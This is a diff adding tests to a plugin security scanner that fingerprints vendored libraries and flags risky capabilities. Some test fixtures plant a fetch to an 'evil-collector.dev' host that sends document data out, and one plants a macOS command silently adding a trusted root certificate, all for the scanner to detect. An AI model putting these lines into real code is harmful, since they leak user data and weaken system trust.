@@ -41,6 +41,15 @@ describe("call normaliser", () => {
     expect(specific("fetch($)")).toBe(false);
   });
 
+  it("keeps a plain-string form of a call that holds a template with nothing in it", () => {
+    const [template] = collect(parseJs("f(`abcd\nefgh`)")).calls;
+    const [string] = collect(parseJs('f("abcd\\nefgh")')).calls;
+    expect(template?.key).not.toBe(string?.key);
+    expect(template?.plainKey).toBe(string?.key);
+    expect(string?.plainKey).toBeUndefined();
+    expect(collect(parseJs("f(`abcd$" + "{x}`)")).calls[0]?.plainKey).toBeUndefined();
+  });
+
   it("records where calls and functions nest", () => {
     const code = "function f() { a(b(1)); } c(function () { d(); });";
     const { calls, fns } = collect(parseJs(code), 100);
@@ -171,6 +180,102 @@ describe("library fingerprints in the scanner", () => {
     expect(r.analysis.transparency.vendoredLibraries.find((v) => v.name === "libx")?.match).toBe(
       "partial",
     );
+  });
+
+  it("keeps a bundler-marked module of the plugin's own out of a library the bundle opens with (banyan)", async () => {
+    // The plugin's functions here are made of plain calls the library's release has too
+    // (`go()`), so by calls alone they look like the library's, and the setting that gates the
+    // code they call would be lost.
+    const release = `${libSource(original)}\nfunction extra() { go(); }`;
+    const index = indexFromSources({ libx: [release] });
+    const go = "go(); go(); go(); go();";
+    const bundle = `// node_modules/libx/dist/index.js
+${release}
+// src/trust.ts
+async function trust() {
+  await Subprocess.call({ command: "/usr/bin/security", arguments: ["add-trusted-cert", "-d", "-r", "trustRoot", ca] }); }
+async function initProxy() { ${go}
+  if (!Zotero.isMac || !getPref("httpsProxyEnabled")) return null;
+  await trust(); }
+async function startup() { ${go} await initProxy(); }
+`;
+    const settings = (r: Awaited<ReturnType<typeof scanFiles>>) =>
+      r.analysis.capabilities.find((c) => c.id === "changes-settings")?.details?.settings;
+    const files = {
+      "prefs.js": 'pref("extensions.zotero.fixture.httpsProxyEnabled", false);',
+      "content/bundle.js": bundle,
+    };
+    const expected = [
+      {
+        change: "certificate",
+        target: "macOS",
+        asks: "none",
+        auto: true,
+        setting: "httpsProxyEnabled",
+      },
+    ];
+    expect(settings(await scanFiles(files))).toEqual(expected);
+    expect(settings(await scanFiles(files, { libraries: index }))).toEqual(expected);
+  });
+
+  it("calls a library partial only where a finding in it failed the check", async () => {
+    const quiet = libSource(renamed, '    helper("a call the release lacks", 1);');
+    const r = await scanFiles({ "content/editor.js": quiet }, { libraries: libraries() });
+    const libx = (x: typeof r) =>
+      x.analysis.transparency.vendoredLibraries.find((v) => v.name === "libx");
+    expect(libx(r)?.match).toBe("release");
+    expect(libx(r)?.unmatched).toBeUndefined();
+    const loud = libSource(renamed, '    fetch("https://evil-collector.dev/c");');
+    const t = await scanFiles({ "content/editor.js": loud }, { libraries: libraries() });
+    expect(libx(t)?.match).toBe("partial");
+  });
+
+  it("charges a failed finding to the library that claimed the code, not to every one in the file", async () => {
+    const other = Array.from(
+      { length: 40 },
+      (_, i) => `zed.registerGadget("gadget-name-${i}", conf.gadgets.item${i});`,
+    ).join("\n");
+    const index = indexFromSources({ libx: [libSource(original)], liby: [other] });
+    const tampered = libSource(
+      renamed,
+      '    fetch("https://evil-collector.dev/collect?d=" + encodeURIComponent(document.title));',
+    );
+    const bundle = `// node_modules/libx/dist/index.js\n${tampered}\n// node_modules/liby/dist/index.js\n${other}\n`;
+    const r = await scanFiles({ "content/bundle.js": bundle }, { libraries: index });
+    const found = (name: string) =>
+      r.analysis.transparency.vendoredLibraries.find((v) => v.name === name);
+    expect(found("libx")?.match).toBe("partial");
+    expect(found("liby")?.match).toBe("release");
+  });
+
+  it("takes a string with a line break as the library's however a minifier wrote it", async () => {
+    // One build keeps it as a string, the other (esbuild) turns it into a template.
+    const message = 'tip.el.show("See https://docs.libx-site.org/guide for\\nhelp");';
+    const asTemplate = "tip.el.show(`See https://docs.libx-site.org/guide for\nhelp`);";
+    const release = `${libSource(original)}\nfunction hint(tip) { ${message} }`;
+    const index = indexFromSources({ libx: [release] });
+    const copy = `${libSource(renamed)}\nfunction hint(t) { ${asTemplate.replace("tip", "t")} }`;
+    const r = await scanFiles({ "content/editor.js": copy }, { libraries: index });
+    expect(hostIn(r, "docs.libx-site.org")?.inVendoredCode).toBe(true);
+    expect(r.analysis.transparency.vendoredLibraries[0]?.match).toBe("release");
+    // A different message in the same place is the plugin's own.
+    const changed = copy.replace("for\nhelp", "for\nmore");
+    const c = await scanFiles({ "content/editor.js": changed }, { libraries: index });
+    expect(hostIn(c, "docs.libx-site.org")?.inVendoredCode).toBe(false);
+  });
+
+  it("takes a long message of the release's in a one-line method as the library's", async () => {
+    const own =
+      'function a(){ throw new Error("need the options first, see https://docs.libx-site.org/opts"); }';
+    const release = `${libSource(original)}\napi.fail = ${own.replace("function a", "function ")};`;
+    const index = indexFromSources({ libx: [release] });
+    const copy = `${libSource(renamed)}\nq.fail = ${own.replace("function a", "function ")};`;
+    const r = await scanFiles({ "content/editor.js": copy }, { libraries: index });
+    expect(hostIn(r, "docs.libx-site.org")?.inVendoredCode).toBe(true);
+    // The same function with another message is not the release's.
+    const changed = copy.replace("need the options first", "need other options first");
+    const c = await scanFiles({ "content/editor.js": changed }, { libraries: index });
+    expect(hostIn(c, "docs.libx-site.org")?.inVendoredCode).toBe(false);
   });
 
   it("doesn't take a file's name as proof it is the library", async () => {
